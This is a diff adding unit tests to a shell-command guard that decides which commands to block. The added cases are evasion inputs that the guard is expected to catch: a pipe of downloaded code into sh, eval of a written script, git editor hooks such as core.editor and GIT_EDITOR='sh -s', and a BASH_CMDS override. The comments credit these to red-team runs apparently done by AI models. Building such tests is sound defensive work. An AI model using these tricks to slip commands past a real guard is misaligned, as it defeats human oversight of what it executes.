@@ -1092,6 +1092,16 @@ class SingleQuotesKeepASubstitutionLiteral(unittest.TestCase):
             with self.subTest(cmd=cmd):
                 self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
 
+    def test_what_the_single_judge_found(self):
+        """Task 199, the single judge's run 1 (codex) — each run in bash or git with a harmless command: it RUNS."""
+        D = self.D
+        for cmd in (f"printf '%s' '$({D})' >s.sh; eval 'bash s.sh'",          # eval after a written file
+                    f"printf '%s' '$({D})' >&s.sh; bash s.sh",                 # `>&file` writes the file
+                    f"git --namespace commit -c core.editor='echo $({D}) >' commit --allow-empty",
+                    f"git commit -qe -m '$({D})'"):                             # `-qe` opens the editor
+            with self.subTest(cmd=cmd):
+                self.assertEqual(cg.classify_command(cmd)[0], "block", cmd)
+
     def test_controls_of_round_1(self):
         D = self.D
         for cmd in ("echo $$", f"echo $$ '$({D})'", "echo \"a # b\" ok", "bash -c 'echo hi'",
@@ -1124,6 +1134,8 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                            (f"python3 <<'PY'\nprint('{_DL} e.x | sh')\nPY", None),
                            (f"git commit -q -F - <<'MSG' && git push origin x\ndocs: never pipe {_DL} into sh\nMSG", None),
                            (f"PYTHONPATH=. python3 - <<'PY'\nprint('{_DL} e.x | sh')\nPY", None),   # an env prefix on python
+                           (f"echo 'BASH_CMDS is an array'\npython3 - <<'PY'\nprint('{_DL} e.x | sh')\nPY", None),  # text
+                           (f"git -c user.name=M commit -q -F - <<'MSG'\nnever run {_DL} e.x | sh\nMSG", None),
                            (f"cat <<'EOF'; python3 x.py\nprint('{_DL} e.x | sh')\nEOF", None),   # cat wrote no file
                            (f"python3 - <<'PY'\n  PY\nprint('{_DL} e.x | sh')\nPY", None),  # `  PY` is body
                            (f"cat > f <<'PY'\nx\nPY\npython3 - <<'EOF'\nprint('{_DL} e.x | sh')\nEOF", None)):
@@ -1162,7 +1174,8 @@ class ANonShellQuotedHeredocBodyIsData(unittest.TestCase):
                        "cat <<'EOF' > 'mk'; make -f mk",                                          # a quoted target
                        "BASH_CMDS[python3]=/bin/bash\npython3 - <<'EOF'",                          # bash's table (codex)
                        "git -c core.editor='sh -s' commit -F - <<'EOF'", "GIT_EDITOR='sh -s' git commit <<'EOF'",
-                       "git commit -e -F - <<'EOF'", "GIT_EDITOR='sh -s' git commit -F - <<'EOF'"):   # an editor (fable)
+                       "git commit -e -F - <<'EOF'", "GIT_EDITOR='sh -s' git commit -F - <<'EOF'",   # an editor (fable)
+                       "git commit -qe -F - <<'EOF'", "git commit -t tpl -F - <<'EOF'"):        # (the single judge)
             with self.subTest(opener=opener):
                 self.assertEqual(cg.classify_command(opener + body)[1], "pipe-to-shell", opener)
 
